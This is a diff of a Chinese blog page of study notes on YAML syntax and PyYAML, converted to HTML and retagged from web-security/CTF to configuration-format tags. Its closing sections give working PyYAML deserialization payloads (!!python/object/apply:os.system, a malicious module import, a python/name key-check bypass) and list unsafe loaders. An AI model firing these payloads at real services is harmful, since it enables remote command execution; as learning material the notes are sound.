@@ -20,20 +20,25 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"manual","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="# YAML  # 安装库  &#96;pip install -i https:&#x2F;&#x2F;pypi.mirrors.ustc.edu.cn&#x2F;simple&#x2F; pyyaml&#96;  ![image.png](&#x2F;yuque-notes&#x2F;02-Knowledge Book&#x2F;assets&#x2F;8b8765d6-image.png)  ![image.png](&#x2F;yuque-notes&#x2F;02-Knowledge Book&#x2F;as">
+  <meta name="description" content="安装库 读取yaml文件 基本概念 是一个可读性高并且容易被人类阅读，容易和脚本语言交互，用来表达资料序列的编程语言。 - 大小写敏感 - 使用缩进表示层级关系 - 缩进不允许使用tab，只允许空格 - 缩进的空格数不重要，只要相同层级的元素左对齐即可 - &#39;#&#39;表示注释 基本语法 ISO 8601…">
 <meta property="og:type" content="article">
 <meta property="og:title" content="YAML">
 <meta property="og:url" content="http://example.com/2026/09/16/49-YAML/index.html">
 <meta property="og:site_name" content="Glut4micum">
-<meta property="og:description" content="# YAML  # 安装库  &#96;pip install -i https:&#x2F;&#x2F;pypi.mirrors.ustc.edu.cn&#x2F;simple&#x2F; pyyaml&#96;  ![image.png](&#x2F;yuque-notes&#x2F;02-Knowledge Book&#x2F;assets&#x2F;8b8765d6-image.png)  ![image.png](&#x2F;yuque-notes&#x2F;02-Knowledge Book&#x2F;as">
+<meta property="og:description" content="安装库 读取yaml文件 基本概念 是一个可读性高并且容易被人类阅读，容易和脚本语言交互，用来表达资料序列的编程语言。 - 大小写敏感 - 使用缩进表示层级关系 - 缩进不允许使用tab，只允许空格 - 缩进的空格数不重要，只要相同层级的元素左对齐即可 - &#39;#&#39;表示注释 基本语法 ISO 8601…">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/yuque-notes/02-Knowledge%20Book/assets/8b8765d6-image.png">
+<meta property="og:image" content="http://example.com/yuque-notes/02-Knowledge%20Book/assets/603a4aad-image.png">
+<meta property="og:image" content="http://example.com/yuque-notes/02-Knowledge%20Book/assets/d4350bf5-image.png">
+<meta property="og:image" content="http://example.com/yuque-notes/02-Knowledge%20Book/assets/7f45e770-image.png">
+<meta property="og:image" content="http://example.com/yuque-notes/02-Knowledge%20Book/assets/593a5b79-8dbaf2fa-14ae-4c61-aac4-af1c0a04fd5c.png!blog">
 <meta property="article:published_time" content="2026-09-16T14:21:03.000Z">
 <meta property="article:modified_time" content="2026-09-16T14:21:03.000Z">
 <meta property="article:author" content="谷氨酸棒状杆菌">
-<meta property="article:tag" content="Web安全">
-<meta property="article:tag" content="CTF">
-<meta property="article:tag" content="学习笔记">
+<meta property="article:tag" content="YAML">
+<meta property="article:tag" content="配置格式">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/yuque-notes/02-Knowledge%20Book/assets/8b8765d6-image.png">
 
 <link rel="canonical" href="http://example.com/2026/09/16/49-YAML/">
 
@@ -235,6 +240,7 @@
               <span class="post-meta-item-text">阅读次数：</span>
               <span id="busuanzi_value_page_pv"></span>
             </span>
+            <div class="post-description">安装库 读取yaml文件 基本概念 是一个可读性高并且容易被人类阅读，容易和脚本语言交互，用来表达资料序列的编程语言。 - 大小写敏感 - 使用缩进表示层级关系 - 缩进不允许使用tab，只允许空格 - 缩进的空格数不重要，只要相同层级的元素左对齐即可 - '#'表示注释 基本语法 ISO 8601…</div>
 
         </div>
       </header>
@@ -245,143 +251,87 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        
-# YAML
+        <h1 id="YAML"><a href="#YAML" class="headerlink" title="YAML"></a>YAML</h1><h1 id="安装库"><a href="#安装库" class="headerlink" title="安装库"></a>安装库</h1><p><code>pip install -i https://pypi.mirrors.ustc.edu.cn/simple/ pyyaml</code></p>
+<p><img src="/yuque-notes/02-Knowledge%20Book/assets/8b8765d6-image.png" alt="image.png"></p>
+<p><img src="/yuque-notes/02-Knowledge%20Book/assets/603a4aad-image.png" alt="image.png"></p>
+<p><img src="/yuque-notes/02-Knowledge%20Book/assets/d4350bf5-image.png" alt="image.png">读取yaml文件</p>
+<p><img src="/yuque-notes/02-Knowledge%20Book/assets/7f45e770-image.png" alt="image.png"></p>
+<h1 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h1><p>是一个可读性高并且容易被人类阅读，容易和脚本语言交互，用来表达资料序列的编程语言。</p>
+<ul>
+<li>大小写敏感</li>
+<li>使用缩进表示层级关系</li>
+<li>缩进不允许使用tab，只允许空格</li>
+<li>缩进的空格数不重要，只要相同层级的元素左对齐即可</li>
+<li>‘#’表示注释</li>
+</ul>
+<h1 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h1><h2 id="ISO-8601"><a href="#ISO-8601" class="headerlink" title="ISO 8601"></a>ISO 8601</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">YYYY表示四位数的年份</span><br><span class="line"></span><br><span class="line">MM表示两位数的月份</span><br><span class="line"></span><br><span class="line">DD表示两位数的天(day of the month)，从01到<span class="number">31</span></span><br><span class="line"></span><br><span class="line">T是用来指示时间元素的开始字符</span><br><span class="line"></span><br><span class="line">hh表示两位数的小时，从<span class="number">00</span>到<span class="number">23</span>，不包括AM/PM</span><br><span class="line"></span><br><span class="line">mm表示两位数的分钟，从<span class="number">00</span>到<span class="number">59</span></span><br><span class="line"></span><br><span class="line">ss表示两位数的秒，从<span class="number">00</span>到<span class="number">59</span></span><br><span class="line"></span><br><span class="line">mmm表示三位数的毫秒数，从<span class="number">000</span>到<span class="number">999</span></span><br><span class="line"></span><br><span class="line">TZD表示时区指示符：Z或+hh:mm或-hh:mm，+或-表示时区距离UTC(世界标准时间)时区多远。例如：</span><br><span class="line"></span><br><span class="line">CST(中国标准时间)：UTC +08:<span class="number">00</span>，EST(东部标准时间)：UTC -05:<span class="number">00</span>，CST(中部标准时间)：UTC -06:<span class="number">00</span>。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-# 安装库
-
-`pip install -i https://pypi.mirrors.ustc.edu.cn/simple/ pyyaml`
-
-![image.png](/yuque-notes/02-Knowledge Book/assets/8b8765d6-image.png)
-
-![image.png](/yuque-notes/02-Knowledge Book/assets/603a4aad-image.png)
-
-![image.png](/yuque-notes/02-Knowledge Book/assets/d4350bf5-image.png)读取yaml文件
-
-![image.png](/yuque-notes/02-Knowledge Book/assets/7f45e770-image.png)
-
-# 基本概念
-
-是一个可读性高并且容易被人类阅读，容易和脚本语言交互，用来表达资料序列的编程语言。
-
-- 大小写敏感
-- 使用缩进表示层级关系
-- 缩进不允许使用tab，只允许空格
-- 缩进的空格数不重要，只要相同层级的元素左对齐即可
-- '#'表示注释
-
-# 基本语法
-
-## ISO 8601
-
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">YYYY表示四位数的年份</span><br><span class="line"></span><br><span class="line">MM表示两位数的月份</span><br><span class="line"></span><br><span class="line">DD表示两位数的天(day of the month)，从01到<span class="number">31</span></span><br><span class="line"></span><br><span class="line">T是用来指示时间元素的开始字符</span><br><span class="line"></span><br><span class="line">hh表示两位数的小时，从<span class="number">00</span>到<span class="number">23</span>，不包括AM/PM</span><br><span class="line"></span><br><span class="line">mm表示两位数的分钟，从<span class="number">00</span>到<span class="number">59</span></span><br><span class="line"></span><br><span class="line">ss表示两位数的秒，从<span class="number">00</span>到<span class="number">59</span></span><br><span class="line"></span><br><span class="line">mmm表示三位数的毫秒数，从<span class="number">000</span>到<span class="number">999</span></span><br><span class="line"></span><br><span class="line">TZD表示时区指示符：Z或+hh:mm或-hh:mm，+或-表示时区距离UTC(世界标准时间)时区多远。例如：</span><br><span class="line"></span><br><span class="line">CST(中国标准时间)：UTC +08:<span class="number">00</span>，EST(东部标准时间)：UTC -05:<span class="number">00</span>，CST(中部标准时间)：UTC -06:<span class="number">00</span>。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-## 数据类型
-
-YAML 支持以下几种数据类型：
-
-1. 对象：键值对的集合，又称为映射（mapping）/ 哈希（hashes） / 字典（dictionary）
-2. 数组：一组按次序排列的值，又称为序列（sequence） / 列表（list）
-3. 纯量（scalars）：单个的、不可再分的值,如:
-
-- 字符串
-- 布尔值
-- 整数
-- 浮点数
-- Null
-- 时间 使用 ISO 8601 格式,时间和日期之间使用T链接+代表时区
-
-例: 2023-09-12T20:22:20+08:00
-
-- 日期 使用 ISO 8601 格式,即 YYYY-MM-DD 对应位数的年月日
-
+<h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>YAML 支持以下几种数据类型：</p>
+<ol>
+<li>对象：键值对的集合，又称为映射（mapping）&#x2F; 哈希（hashes） &#x2F; 字典（dictionary）</li>
+<li>数组：一组按次序排列的值，又称为序列（sequence） &#x2F; 列表（list）</li>
+<li>纯量（scalars）：单个的、不可再分的值,如:</li>
+</ol>
+<ul>
+<li>字符串</li>
+<li>布尔值</li>
+<li>整数</li>
+<li>浮点数</li>
+<li>Null</li>
+<li>时间 使用 ISO 8601 格式,时间和日期之间使用T链接+代表时区</li>
+</ul>
+<p>例: 2023-09-12T20:22:20+08:00</p>
+<ul>
+<li>日期 使用 ISO 8601 格式,即 YYYY-MM-DD 对应位数的年月日</li>
+</ul>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">key: <span class="comment">#冒号后面要加一个空格,缩进表示层级</span></span><br><span class="line">    child-key: value</span><br><span class="line">    child-key2: value2</span><br><span class="line">key:&#123;key1: value1, key2: value2, ...&#125;<span class="comment">#也表示对象键值对</span></span><br><span class="line"><span class="comment">#复杂的对象,?+space表示是键,:+space表示值</span></span><br><span class="line">?  </span><br><span class="line">    - complexkey1</span><br><span class="line">    - complexkey2</span><br><span class="line">:</span><br><span class="line">    - complexvalue1</span><br><span class="line">    - complexvalue2</span><br><span class="line"><span class="comment"># -+space+数组名 开头表示数组</span></span><br><span class="line">- A</span><br><span class="line"><span class="comment">#多维数组</span></span><br><span class="line">companies:</span><br><span class="line">    -</span><br><span class="line">        <span class="built_in">id</span>: <span class="number">1</span></span><br><span class="line">        name: company1</span><br><span class="line">        price: 200W</span><br><span class="line">    -</span><br><span class="line">        <span class="built_in">id</span>: <span class="number">2</span></span><br><span class="line">        name: company2</span><br><span class="line">        price: 500W</span><br><span class="line"><span class="comment">#数组表示方法2 flow流式</span></span><br><span class="line">companies: [&#123;<span class="built_in">id</span>: <span class="number">1</span>,name: company1,price: 200W&#125;,&#123;<span class="built_in">id</span>: <span class="number">2</span>,name: company2,price: 500W&#125;]</span><br><span class="line"></span><br><span class="line">boolean: </span><br><span class="line">    - TRUE  <span class="comment">#true,True都可以</span></span><br><span class="line">    - FALSE  <span class="comment">#false，False都可以</span></span><br><span class="line"><span class="built_in">float</span>:</span><br><span class="line">    - <span class="number">3.14</span></span><br><span class="line">    - <span class="number">6.8523015e+5</span>  <span class="comment">#可以使用科学计数法</span></span><br><span class="line"><span class="built_in">int</span>:</span><br><span class="line">    - <span class="number">123</span></span><br><span class="line">    - <span class="number">0b1010_0111_0100_1010_1110</span>    <span class="comment">#二进制表示</span></span><br><span class="line">null:</span><br><span class="line">    nodeName: <span class="string">&#x27;node&#x27;</span></span><br><span class="line">    parent: ~  <span class="comment">#使用~表示null</span></span><br><span class="line">string:</span><br><span class="line">    - 哈哈</span><br><span class="line">    - <span class="string">&#x27;Hello world&#x27;</span>  <span class="comment">#可以使用双引号或者单引号包裹特殊字符</span></span><br><span class="line">    - newline</span><br><span class="line">      newline2    <span class="comment">#字符串可以拆成多行，每一行会被转化成一个空格</span></span><br><span class="line">date:</span><br><span class="line">    - <span class="number">2018</span>-02-<span class="number">17</span>    <span class="comment">#日期必须使用ISO 8601格式，即yyyy-MM-dd</span></span><br><span class="line">datetime: </span><br><span class="line">    -  <span class="number">2018</span>-02-17T15:02:<span class="number">31</span>+08:<span class="number">00</span>    </span><br><span class="line"><span class="comment">#时间使用ISO 8601格式，时间和日期之间使用T连接，最后使用+代表时区</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#强制类型转换 用!!</span></span><br></pre></td></tr></table></figure>
 
-![image](/yuque-notes/02-Knowledge Book/assets/593a5b79-8dbaf2fa-14ae-4c61-aac4-af1c0a04fd5c.png!blog)
-
-强制类型转换汇总图
-
-## 引用
-
-**&** 用来建立锚点（defaults），**<<** 表示合并到当前数据，***** 用来引用锚点
-
+<p><img src="/yuque-notes/02-Knowledge%20Book/assets/593a5b79-8dbaf2fa-14ae-4c61-aac4-af1c0a04fd5c.png!blog" alt="image"></p>
+<p>强制类型转换汇总图</p>
+<h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><p><strong>&amp;</strong> 用来建立锚点（defaults），**&lt;&lt;** 表示合并到当前数据，***** 用来引用锚点</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">defaults: &amp;defaults <span class="comment">#建立锚点</span></span><br><span class="line">  adapter:  postgres</span><br><span class="line">  host:     localhost</span><br><span class="line"></span><br><span class="line">development:</span><br><span class="line">  database: myapp_development</span><br><span class="line">  &lt;&lt;: *defaults</span><br><span class="line"></span><br><span class="line">test:</span><br><span class="line">  database: myapp_test</span><br><span class="line">  &lt;&lt;: *defaults</span><br></pre></td></tr></table></figure>
 
-# 序列化和反序列化
-
-yaml.dump()：将一个Python对象序列化生成为yaml文档。
-
-yaml.load()：将一个yaml文档反序列化为一个Python对象。
-
+<h1 id="序列化和反序列化"><a href="#序列化和反序列化" class="headerlink" title="序列化和反序列化"></a>序列化和反序列化</h1><p>yaml.dump()：将一个Python对象序列化生成为yaml文档。</p>
+<p>yaml.load()：将一个yaml文档反序列化为一个Python对象。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> yaml</span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&quot;文件路径&quot;</span>,<span class="string">&quot;r&quot;</span>)<span class="comment">#可读</span></span><br><span class="line">y=yaml.load(f)</span><br><span class="line"><span class="built_in">print</span>(y)</span><br></pre></td></tr></table></figure>
 
-# 常用函数
-
-1. yaml.load(stream, Loader=yaml.Loader, **kwds)：用于从 YAML 文件或字符串中读取数据，并将其转换为 Python 对象。
-2. yaml.dump(data, stream=None, Dumper=yaml.Dumper, **kwds)：用于将 Python 对象转换为 YAML 文件或字符串，并将其写入到文件或流中。
-3. yaml.add_constructor(tag, constructor, Loader=yaml.Loader)：用于添加自定义的构造函数，以将特定的 YAML 标记转换为 Python 对象。
-4. yaml.add_representer(data_type, representer, Dumper=yaml.Dumper)：用于添加自定义的表示函数，以将 Python 对象转换为 YAML 标量。
-
-# PyYAML小于5.1
-
-## 漏洞成因
-
-主要在PyYaml<=5.1的版本下，默认Constructor为加载器，但是经过审计yaml模块中的Constructor.py的源码中存在对于python的标签解析时的漏洞。
-
-## python/object/apply原理
-
-`python/object/apply`tag对应python函数中`construct_python_object_apply`
-
-再往下进入到`make_python_instance`函数中
-
+<h1 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h1><ol>
+<li>yaml.load(stream, Loader&#x3D;yaml.Loader, **kwds)：用于从 YAML 文件或字符串中读取数据，并将其转换为 Python 对象。</li>
+<li>yaml.dump(data, stream&#x3D;None, Dumper&#x3D;yaml.Dumper, **kwds)：用于将 Python 对象转换为 YAML 文件或字符串，并将其写入到文件或流中。</li>
+<li>yaml.add_constructor(tag, constructor, Loader&#x3D;yaml.Loader)：用于添加自定义的构造函数，以将特定的 YAML 标记转换为 Python 对象。</li>
+<li>yaml.add_representer(data_type, representer, Dumper&#x3D;yaml.Dumper)：用于添加自定义的表示函数，以将 Python 对象转换为 YAML 标量。</li>
+</ol>
+<h1 id="PyYAML小于5-1"><a href="#PyYAML小于5-1" class="headerlink" title="PyYAML小于5.1"></a>PyYAML小于5.1</h1><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>主要在PyYaml&lt;&#x3D;5.1的版本下，默认Constructor为加载器，但是经过审计yaml模块中的Constructor.py的源码中存在对于python的标签解析时的漏洞。</p>
+<h2 id="python-object-apply原理"><a href="#python-object-apply原理" class="headerlink" title="python&#x2F;object&#x2F;apply原理"></a>python&#x2F;object&#x2F;apply原理</h2><p><code>python/object/apply</code>tag对应python函数中<code>construct_python_object_apply</code></p>
+<p>再往下进入到<code>make_python_instance</code>函数中</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">yaml.load(<span class="string">&#x27;exp: !!python/object/apply:os.system [whoami]&#x27;</span>)<span class="comment">#或者反弹shell命令</span></span><br></pre></td></tr></table></figure>
 
-python/object/new
-
-## python/object
-
-对应为construct_python_object
-
-这个函数没有参数,只能通过无参方法命令执行
-
-`!!python/object:builtins.copyright {"键":"值"}`
-
-## python/module:package.class
-
-对应函数为`construct_python_module`,该函数调用了`find_python_module`这个函数中调用了__import__
-
-首先构造一个恶意的py脚本
-
+<p>python&#x2F;object&#x2F;new</p>
+<h2 id="python-object"><a href="#python-object" class="headerlink" title="python&#x2F;object"></a>python&#x2F;object</h2><p>对应为construct_python_object</p>
+<p>这个函数没有参数,只能通过无参方法命令执行</p>
+<p><code>!!python/object:builtins.copyright {&quot;键&quot;:&quot;值&quot;}</code></p>
+<h2 id="python-module-package-class"><a href="#python-module-package-class" class="headerlink" title="python&#x2F;module:package.class"></a>python&#x2F;module:package.class</h2><p>对应函数为<code>construct_python_module</code>,该函数调用了<code>find_python_module</code>这个函数中调用了__import__</p>
+<p>首先构造一个恶意的py脚本</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&quot;whoami&quot;</span>)</span><br></pre></td></tr></table></figure>
 
-强制类型转换触发即可
-
+<p>强制类型转换触发即可</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> yaml</span><br><span class="line">yaml.load(<span class="string">&#x27;exp: !!!!python/moaule:文件路径/项目名称.恶意文件名&#x27;</span>)</span><br></pre></td></tr></table></figure>
 
-## python/name
-
-和python/module标签的逻辑类似，不过!!python/name标签可以返回模块下面的属性/方法
-
+<h2 id="python-name"><a href="#python-name" class="headerlink" title="python&#x2F;name"></a>python&#x2F;name</h2><p>和python&#x2F;module标签的逻辑类似，不过!!python&#x2F;name标签可以返回模块下面的属性&#x2F;方法</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> yaml</span><br><span class="line"></span><br><span class="line">KEY = <span class="string">&#x27;Evi1s7&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">miyao</span>):</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    key = yaml.load(miyao).get(<span class="string">&quot;key&quot;</span>,<span class="literal">None</span>)</span><br><span class="line"><span class="keyword">except</span> Exception:</span><br><span class="line">    key = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> key == KEY:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;你好Evi1s7&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;陌生人爬&quot;</span>)</span><br><span class="line"></span><br><span class="line">miyao = <span class="string">&#x27;&#x27;</span></span><br><span class="line">check(miyao)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-这里的payload`?key=!!python/name:__main__.KEY`可以直接绕过验证
-
-# 版本大于5.1
-
-常用的利用方法和小于5.1的版本是一样的,需要额外加上构造器
-
-1. yaml.unsafe_load(exp)
-2. yaml.unsafe_load_all(exp)
-3. yaml.load(exp,Loader=UnsafeLoader)
-4. yaml.load_all(exp,Loader=UnsafeLoader)
-5. yaml.load(exp,Loader=Loader)
-6. yaml.load_all(exp,Loader=Loader)
-
----
-
-来源: https://www.yuque.com/guansuanbangzhuangganjun/oxmbxg/mwlmhu7lrsdghguf
-语雀文档ID: 139684579
-
+<p>这里的payload<code>?key=!!python/name:__main__.KEY</code>可以直接绕过验证</p>
+<h1 id="版本大于5-1"><a href="#版本大于5-1" class="headerlink" title="版本大于5.1"></a>版本大于5.1</h1><p>常用的利用方法和小于5.1的版本是一样的,需要额外加上构造器</p>
+<ol>
+<li>yaml.unsafe_load(exp)</li>
+<li>yaml.unsafe_load_all(exp)</li>
+<li>yaml.load(exp,Loader&#x3D;UnsafeLoader)</li>
+<li>yaml.load_all(exp,Loader&#x3D;UnsafeLoader)</li>
+<li>yaml.load(exp,Loader&#x3D;Loader)</li>
+<li>yaml.load_all(exp,Loader&#x3D;Loader)</li>
+</ol>
+<hr>
+<p>来源: <a target="_blank" rel="noopener" href="https://www.yuque.com/guansuanbangzhuangganjun/oxmbxg/mwlmhu7lrsdghguf">https://www.yuque.com/guansuanbangzhuangganjun/oxmbxg/mwlmhu7lrsdghguf</a><br>语雀文档ID: 139684579</p>
 
     </div>
 
@@ -391,9 +341,8 @@ python/object/new
 
       <footer class="post-footer">
           <div class="post-tags">
-              <a href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag"># Web安全</a>
-              <a href="/tags/CTF/" rel="tag"># CTF</a>
-              <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag"># 学习笔记</a>
+              <a href="/tags/YAML/" rel="tag"># YAML</a>
+              <a href="/tags/%E9%85%8D%E7%BD%AE%E6%A0%BC%E5%BC%8F/" rel="tag"># 配置格式</a>
           </div>
 
         
@@ -467,6 +416,7 @@ python/object/new
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#YAML"><span class="nav-number">1.</span> <span class="nav-text">YAML</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AE%89%E8%A3%85%E5%BA%93"><span class="nav-number">2.</span> <span class="nav-text">安装库</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"><span class="nav-number">3.</span> <span class="nav-text">基本概念</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95"><span class="nav-number">4.</span> <span class="nav-text">基本语法</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ISO-8601"><span class="nav-number">4.1.</span> <span class="nav-text">ISO 8601</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B"><span class="nav-number">4.2.</span> <span class="nav-text">数据类型</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BC%95%E7%94%A8"><span class="nav-number">4.3.</span> <span class="nav-text">引用</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">5.</span> <span class="nav-text">序列化和反序列化</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0"><span class="nav-number">6.</span> <span class="nav-text">常用函数</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PyYAML%E5%B0%8F%E4%BA%8E5-1"><span class="nav-number">7.</span> <span class="nav-text">PyYAML小于5.1</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="nav-number">7.1.</span> <span class="nav-text">漏洞成因</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#python-object-apply%E5%8E%9F%E7%90%86"><span class="nav-number">7.2.</span> <span class="nav-text">python&#x2F;object&#x2F;apply原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#python-object"><span class="nav-number">7.3.</span> <span class="nav-text">python&#x2F;object</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#python-module-package-class"><span class="nav-number">7.4.</span> <span class="nav-text">python&#x2F;module:package.class</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#python-name"><span class="nav-number">7.5.</span> <span class="nav-text">python&#x2F;name</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%89%88%E6%9C%AC%E5%A4%A7%E4%BA%8E5-1"><span class="nav-number">8.</span> <span class="nav-text">版本大于5.1</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -482,7 +432,7 @@ python/object/new
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">72</span>
+          <span class="site-state-item-count">64</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -495,7 +445,7 @@ python/object/new
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-count">94</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
